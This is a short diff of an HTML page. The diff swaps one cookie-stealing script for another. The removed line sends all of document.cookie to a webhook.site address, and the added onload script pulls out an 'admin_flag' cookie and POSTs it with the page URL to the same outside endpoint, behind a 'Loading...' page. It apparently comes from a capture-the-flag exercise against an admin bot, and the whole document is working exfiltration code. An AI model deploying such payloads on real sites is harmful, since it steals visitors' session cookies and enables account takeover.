@@ -6,8 +6,22 @@
 </head>
 <body>
   <script>
-    new Image().src = "https://webhook.site/e190e44a-628f-4548-ad2b-ebddf8804ea2?cookie=" + encodeURIComponent(document.cookie);
-  </script>
+  // When the page loads
+  window.onload = () => {
+    const cookies = document.cookie.split(';').map(c => c.trim());
+    const adminFlagCookie = cookies.find(c => c.startsWith('admin_flag='));
+    if (adminFlagCookie) {
+      const flagValue = adminFlagCookie.split('=')[1];
+      // Send flag value to your webhook URL
+      fetch('https://webhook.site/e190e44a-628f-4548-ad2b-ebddf8804ea2/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ admin_flag: flagValue, url: window.location.href })
+      });
+    }
+  };
+</script>
+
   <h1>Loading...</h1>
 </body>
 </html>
